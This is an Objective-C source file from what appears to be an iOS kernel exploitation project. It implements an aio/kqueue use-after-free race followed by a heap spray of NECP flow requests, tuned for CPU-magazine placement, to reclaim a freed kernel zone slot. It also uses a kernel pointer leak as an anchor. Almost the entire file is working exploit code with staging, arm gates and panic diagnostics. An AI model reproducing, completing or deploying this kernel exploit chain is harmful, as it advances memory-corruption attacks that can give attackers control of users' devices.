//
//  KRWChainT8Controller.m — KERNEL T8: the aio->NECP reclaim composite
//  (the 192-class convergence lane). krw8.
//
//  The chain (every claim VA+insn cited in
//  ios-xnu-hunt/findings/2026-11-21_necp_client_flow_reclaim_path.md):
//    STEP 1 anchor  — the 84530 oracle E1 (the zone-neighborhood anchor).
//    STEP 2 stage   — necp_open + 8 clients + 512 pre-built ADD_FLOW
//                    requests (the reclaim vehicle; no entitlement on the
//                    flow path). The shape matrix finds the working flags.
//    STEP 3 arm     — Documents/t8_race_arm.txt gates the RACE stage.
//                    Unarmed = the DRY LANE (the battery without the race,
//                    PANIC-FREE — the lane proof).
//    STEP 4 race    — ONE per fresh boot: occupant -> kq -> dup(keep) ->
//                    closer-armed -> racer (SIGEV_KEVENT). EAGAIN = the
//                    window. The closer thread ITSELF fires the battery
//                    right after close() returns — the SAME CPU as the
//                    free (the v5 flaw fixed: the AVE2/apfs churn ran on
//                    the main thread's affinity tag and could not see the
//                    freeing CPU's zone magazine LIFO; findings §7).
//    STEP 5 witness — E2 + the verdict (the 17:33 budget law: E2=none =
//                    the AIO budget consumed = the success signal; the
//                    panic's rc names the claimant slot).
//    STEP 6 teardown— close(keep) = the second put (PANIC-POSSIBLE), then
//                    close(nfd) = the flow cleanup (the corrupted-flow
//                    receipt channel — a flow hit at +0x2c by the stale
//                    put shows there).
//
//  hasKread UNTOUCHED. T8 is a receipt collector — no kread claims, no
//  slide, no magic. The panic rc math (E1 + k*0xc0, the 17:33 law) is the
//  placement proof. PANIC-POSSIBLE (the armed race stage only).
//  ONE TAP. Fresh boot law.
//

#import "KRWChainT8Controller.h"
#import "P179NecpFlowSpray.h"
#import "P063AioKqueueLeak.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <pthread.h>
#import <fcntl.h>
#import <unistd.h>
#import <string.h>
#import <stdlib.h>
#import <stdio.h>
#import <errno.h>
#import <aio.h>
#import <sys/syscall.h>
#import <sys/errno.h>
#import <sys/event.h>
#import <sys/socket.h>
#import <stdatomic.h>
#import <mach/mach_time.h>

#define T8_BUILD @"t8-necp-reclaim-v1"

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4   /* the AVEOpenSmoke Darwin law (tap line 11258) */
#endif

/* ---- the logging (the P177 self-contained pattern — both trees) --------- */

static int t8_logfd = -1;
static void t8_log(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    fprintf(stderr, "%s\n", buf);
    fflush(stderr);
    if (t8_logfd >= 0) {
        write(t8_logfd, buf, strlen(buf));
        write(t8_logfd, "\n", 1);
        fcntl(t8_logfd, F_FULLFSYNC);
    }
}

/* ---- the aio race core (the v5 mechanics, ONE iteration — the v6 law) --- */

static volatile int t8_stop = 0;
static volatile int t8_lookup = -1;
static volatile int t8_do_close = 0;
static int t8_file = -1;
static uint8_t t8_buf[64];

static void t8_pin(int tag) {
    thread_t t = mach_thread_self();
    thread_affinity_policy_data_t p = { .affinity_tag = tag };
    thread_policy_set(t, THREAD_AFFINITY_POLICY, (thread_policy_t)&p,
                      THREAD_AFFINITY_POLICY_COUNT);
    mach_port_deallocate(mach_task_self(), t);
}

static void t8_fill_none(struct aiocb *cb) {
    memset(cb, 0, sizeof *cb);
    cb->aio_fildes = t8_file;
    cb->aio_buf = t8_buf;
    cb->aio_nbytes = 1;
    cb->aio_sigevent.sigev_notify = SIGEV_NONE;
}

static void t8_fill_kevent(struct aiocb *cb, int kq) {
    memset(cb, 0, sizeof *cb);
    cb->aio_fildes = t8_file;
    cb->aio_buf = t8_buf;
    cb->aio_nbytes = 1;
    cb->aio_sigevent.sigev_notify = SIGEV_KEVENT;
    cb->aio_sigevent.sigev_signo = kq;
}

static int t8_aio_read(struct aiocb *cb) {
    int rc = aio_read(cb);
    if (rc != 0 && errno == EINVAL)
        rc = (int)syscall(SYS_aio_read, cb);
    return rc;
}

static void t8_reap(struct aiocb *cb) {
    aio_cancel(cb->aio_fildes, cb);
    for (int i = 0; i < 100000; i++) {
        int e = aio_error(cb);
        if (e != EINPROGRESS) break;
    }
    aio_return(cb);
}

/* ---- the battery (pre-staged in STEP 2, fired on the closer's CPU) ------ */

#define T8_CLIENTS 8
#define T8_FLOWS_PER 64
#define T8_BATTERY_N (T8_CLIENTS * T8_FLOWS_PER)

struct t8_req {
    uint8_t cid[16];
    uint8_t req[NECP179_FLOW_REQ_SIZE];
};
static struct t8_req t8_reqs[T8_BATTERY_N];
static int t8_req_n = 0;
static int t8_nfd = -1;
static int t8_flows_ok = 0;
static uint64_t t8_spray_us = 0;

static volatile int t8_spray_go = 0;   /* plain volatile — the memory-ordering
   law is the P177 sprayGo pattern: the closer only reads it after its own
   close() returns, and the battery is idempotent (spray_go cleared before
   firing). The done flag IS atomic (the main thread's bounded wait). */
static atomic_int t8_spray_done = 0;

static void t8_fire_battery(void) {
    static mach_timebase_info_data_t tb;
    if (!tb.denom) mach_timebase_info(&tb);
    uint64_t t0 = mach_absolute_time();
    int ok = 0;
    for (int i = 0; i < t8_req_n; i++) {
        int rc = necp179_add_flow_req(t8_nfd, t8_reqs[i].cid,
                                      t8_reqs[i].req, NECP179_FLOW_REQ_SIZE);
        if (rc == 0) ok++;
    }
    uint64_t t1 = mach_absolute_time();
    t8_spray_us = (t1 - t0) * tb.numer / tb.denom / 1000;
    t8_flows_ok = ok;
    atomic_store(&t8_spray_done, 1);
}

/* The closer thread: pin(3) — the SAME affinity tag the v5 closer used, so
   the free (the first put, inside close()) lands on the CPU whose zone
   magazine the battery then allocates from (the LIFO top — the structural
   fix for the v5 verdict "external churn loses to self-recycle"). */
static void *t8_closer(void *arg) {
    (void)arg;
    t8_pin(3);
    while (!t8_stop) {
        if (t8_do_close) {
            int fd = t8_lookup;
            if (fd >= 0) {
                t8_lookup = -1;
                close(fd);              /* the FIRST put — the free, THIS cpu */
                if (t8_spray_go) {
                    t8_spray_go = 0;
                    t8_fire_battery();  /* same-CPU magazine LIFO — the claim */
                }
            }
        }
    }
    return NULL;
}

/* ---- the sequencer ------------------------------------------------------- */

@implementation KRWChainT8Controller

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject] ?: @"";
    /* ARC's jump law: the STEP-2 HOLD gotos jump forward to the tail label,
       so every ObjC pointer must be declared HERE with a constant (nil)
       initializer — a non-constant strong init in the jumped-over span is
       "cannot jump from this goto statement to its label" (the CI receipt). */
    NSFileManager *fm = nil;
    NSString *bp = nil;
    t8_logfd = open([docs stringByAppendingPathComponent:
                     @"t8_necp_reclaim_log.txt"].fileSystemRepresentation,
                    O_CREAT | O_WRONLY | O_TRUNC, 0644);

    t8_log("=== t8 session %s BUILD %s ===",
           [LabLocalMilitaryNow() UTF8String] ?: "?", T8_BUILD.UTF8String);
    t8_log("%s", [LabDeviceProfile identBlock].UTF8String ?: "");
    t8_log("KERNEL T8 — the aio->NECP reclaim composite (the 192-class lane).");
    t8_log("hasKread untouched. Receipt collector only. ONE TAP. Fresh boot law.");
    t8_log("");

    /* STEP 1 — the anchor (the 84530 oracle) */
    uint64_t e1 = [P063AioKqueueLeak witnessEntryKptr];
    t8_log("STEP1 anchor E1=0x%llx (the 84530 oracle — the zone neighborhood)",
           (unsigned long long)e1);

    /* STEP 2 — the NECP stage */
    t8_nfd = necp179_open_fd();
    if (t8_nfd < 0) {
        t8_log("STEP2 necp_open FAIL errno=%d — HOLD (the NECP lane decode-owed)", errno);
        goto hold;
    }
    uint8_t cids[T8_CLIENTS][16];
    int clients_ok = 0;
    for (int i = 0; i < T8_CLIENTS && clients_ok < T8_CLIENTS; i++) {
        uint8_t cid[16];
        if (necp179_add_client(t8_nfd, cid) == 0)
            memcpy(cids[clients_ok++], cid, 16);   /* compact — no holes */
    }
    t8_log("STEP2 necp fd=%d clients %d/%d", t8_nfd, clients_ok, T8_CLIENTS);
    if (clients_ok == 0) {
        t8_log("STEP2 ADD fails on this build — the params blob shape decode-owed. HOLD.");
        goto hold;
    }

    /* the shape matrix (the recipe decode: 0x0000 = the guaranteed
       persistent-flow path — the unconditional kalloc at 0xfffffff00a0b6394;
       the window [0x23,0xf0] — 0x24 = the exact fixed header) */
    static const uint16_t fl_cand[3] = {0x00, 0x04, 0x40};
    int best = -1;
    for (int k = 0; k < 3; k++) {
        uint8_t sa[16];
        necp179_sa_fill(sa, 10, 188, 0, (uint8_t)(1 + k), (uint16_t)(6666 + k));
        int rc = necp179_add_flow(t8_nfd, cids[0], sa, fl_cand[k]);
        t8_log("STEP2 matrix flags=0x%02x rc=%d errno=%d", fl_cand[k], rc, errno);
        if (rc == 0 && best < 0) best = fl_cand[k];
    }
    if (best < 0) {
        t8_log("STEP2 no working ADD_FLOW shape — decode-owed. HOLD (nothing raced).");
        goto hold;
    }
    t8_log("STEP2 working shape flags=0x%02x %s", best,
           best == 0x00 ? "(the GUARANTEED persistent path)" : "(check the recipe file)");

    /* pre-stage the battery */
    t8_req_n = 0;
    for (int c = 0; c < clients_ok && t8_req_n < T8_BATTERY_N; c++) {
        for (int f = 0; f < T8_FLOWS_PER && t8_req_n < T8_BATTERY_N; f++) {
            struct t8_req *r = &t8_reqs[t8_req_n++];
            memcpy(r->cid, cids[c], 16);
            uint8_t sa[16];
            necp179_sa_fill(sa, 10, (uint8_t)(99 + c), (uint8_t)(f >> 8),
                            (uint8_t)(f & 0xff), (uint16_t)(0x5000 + f));
            necp179_req_fill(r->req, sa, (uint16_t)best);
        }
    }
    t8_log("STEP2 battery staged: %d requests (8 clients x 64, unique sockaddrs)",
           t8_req_n);

    /* STEP 3 — the arm gate */
    fm = [NSFileManager defaultManager];
    BOOL armed = [fm fileExistsAtPath:
                  [docs stringByAppendingPathComponent:@"t8_race_arm.txt"]];
    if (!armed) {
        t8_log("STEP3 t8_race_arm.txt ABSENT — the DRY LANE (PANIC-FREE):");
        t8_log("      the battery fires WITHOUT the race — the lane proof.");
        t8_fire_battery();
        t8_log("STEP3 DRY flows_ok=%d/%d in %llu us",
               t8_flows_ok, t8_req_n, (unsigned long long)t8_spray_us);
        close(t8_nfd); t8_nfd = -1;
        t8_log("STEP3 DRY teardown done (the flow cleanup ran).");
        t8_log("STEP3 raise t8_race_arm.txt (ARMORY) + a FRESH BOOT to run the race.");
        t8_log("=== T8 DRY-LANE COMPLETE flows=%d/%d — ARM to race ===",
               t8_flows_ok, t8_req_n);
        [out appendFormat:
         @"T8 DRY-LANE flows=%d/%d (%llu us) clients=%d shape=0x%02x — ARM to race",
         t8_flows_ok, t8_req_n, (unsigned long long)t8_spray_us,
         clients_ok, best];
        if (t8_logfd >= 0) close(t8_logfd);
        t8_logfd = -1;
        return out;
    }
    t8_log("STEP3 t8_race_arm.txt PRESENT — the armed race. PANIC-POSSIBLE.");
    t8_log("      ONE TAP PER FRESH BOOT. The second put fires at the teardown.");

    /* STEP 4 — the race */
    bp = [docs stringByAppendingPathComponent:@"t8_aio_backing.bin"];
    t8_file = open(bp.fileSystemRepresentation, O_CREAT | O_RDWR | O_TRUNC, 0644);
    if (t8_file < 0) {
        t8_log("STEP4 backing open FAIL errno=%d — HOLD", errno);
        goto hold;
    }
    uint8_t wbuf[4096];
    memset(wbuf, 0x61, sizeof wbuf);
    if (write(t8_file, wbuf, sizeof wbuf) > 0) fsync(t8_file);  /* the 17:32 law */

    t8_pin(7);   /* the main thread's tag (the v5 law) */
    t8_spray_go = 1;
    atomic_store(&t8_spray_done, 0);
    t8_stop = 0;
    pthread_t closer;
    if (pthread_create(&closer, NULL, t8_closer, NULL) != 0) {
        t8_log("STEP4 pthread_create FAIL — HOLD");
        t8_spray_go = 0;
        goto hold;
    }

    struct aiocb occ;
    t8_fill_none(&occ);
    if (t8_aio_read(&occ) != 0) {
        t8_reap(&occ);
        t8_log("STEP4 occupant submit FAIL — HOLD");
        t8_stop = 1; pthread_join(closer, NULL);
        goto hold;
    }

    int kq = kqueue();
    int keep = -1;
    if (kq < 0 || (keep = dup(kq)) < 0) {
        t8_log("STEP4 kq/dup FAIL errno=%d — HOLD", errno);
        if (kq >= 0) close(kq);
        t8_reap(&occ);
        t8_stop = 1; pthread_join(closer, NULL);
        goto hold;
    }

    t8_lookup = kq;
    t8_do_close = 1;                     /* arm the closer (spray_go held) */
    t8_fill_kevent(&occ, kq);
    int rc = t8_aio_read(&occ);          /* the racer — races the close */
    int saved = errno;
    t8_do_close = 0;
    if (t8_lookup == kq) { t8_lookup = -1; close(kq); }

    int window = (rc != 0 && saved == EAGAIN);
    t8_log("STEP4 racer rc=%d errno=%d window=%s",
           rc, saved, window ? "HIT (EAGAIN — the entry freed)" : "miss");
    t8_reap(&occ);

    /* the battery: the closer fires it post-close on ITS cpu; if the closer
       never consumed the lookup (we closed kq ourselves), fire the fallback
       on the main thread and record the weaker placement. */
    for (int i = 0; i < 3000 && !atomic_load(&t8_spray_done); i++) usleep(1000);
    int fallback = 0;
    if (!atomic_load(&t8_spray_done) && t8_spray_go) {
        t8_spray_go = 0;
        fallback = 1;
        t8_fire_battery();               /* the fallback — main-cpu placement */
        t8_log("STEP4 battery FALLBACK (main thread — the closer missed the kq)");
    }
    if (atomic_load(&t8_spray_done))
        t8_log("STEP4 battery fired: flows_ok=%d/%d in %llu us (%s-cpu)%s",
               t8_flows_ok, t8_req_n, (unsigned long long)t8_spray_us,
               fallback ? "main" : "closer",
               window ? "" : " — window missed, the flows allocate fresh");

    /* STEP 5 — the witness + the verdict (the 17:33 budget law) */
    uint64_t e2 = [P063AioKqueueLeak witnessEntryKptr];
    const char *verdict =
        (e2 == 0) ? "none — AIO budget consumed (the 17:33 law: the leak HELD = the success signal; the panic's rc names the claimant slot)" :
        (e2 == e1) ? "SAME-SLOT — an aio entry self-recycled (the v5 result; the battery lost the LIFO)" :
                     "MOVED — a non-aio object claimed the neighborhood (the battery candidate)";
    t8_log("STEP5 E2=0x%llx verdict: %s", (unsigned long long)e2, verdict);
    t8_log("STEP5 flows_ok=%d — if >0 and the budget held, a necp_client_flow (0xb0)");
    t8_log("      is the leading claimant of the freed 0xc0 slot.");

    /* STEP 6 — the honest teardown */
    t8_log("STEP6 close(keep) — the second put. PANIC-POSSIBLE (the rc math:");
    t8_log("      panic-rc = E1 + k*0xc0 names the element that took the put).");
    close(keep);
    t8_log("STEP6 close(keep) returned — the put fired into whatever holds the slot.");
    t8_log("STEP6 close(nfd) — the flow cleanup (the corrupted-flow receipt channel).");
    close(t8_nfd); t8_nfd = -1;
    t8_log("STEP6 necp fd closed — the flow teardown ran.");
    t8_stop = 1;
    pthread_join(closer, NULL);
    close(t8_file); t8_file = -1;
    t8_log("=== T8 SURVIVED the armed race — the receipts above (+ the panic file, if any) ===");
    t8_log("    window=%s flows_ok=%d/%d E1=0x%llx E2=0x%llx",
           window ? "HIT" : "miss", t8_flows_ok, t8_req_n,
           (unsigned long long)e1, (unsigned long long)e2);
    t8_log("    hasKread untouched — the panic rc math is the placement proof.");

    [out appendFormat:
     @"T8 ARMED window=%@ flows=%d/%d E1=0x%llx E2=0x%llx SURVIVED — receipt log t8_necp_reclaim_log.txt",
     window ? @"HIT" : @"miss", t8_flows_ok, t8_req_n,
     (unsigned long long)e1, (unsigned long long)e2];
    if (t8_logfd >= 0) close(t8_logfd);
    t8_logfd = -1;
    return out;

hold:
    if (t8_nfd >= 0) { close(t8_nfd); t8_nfd = -1; }
    if (t8_file >= 0) { close(t8_file); t8_file = -1; }
    t8_log("=== T8 HOLD — the receipts above name the blocked stage ===");
    [out appendString:@"T8 HOLD — see t8_necp_reclaim_log.txt"];
    if (t8_logfd >= 0) close(t8_logfd);
    t8_logfd = -1;
    return out;
}

@end
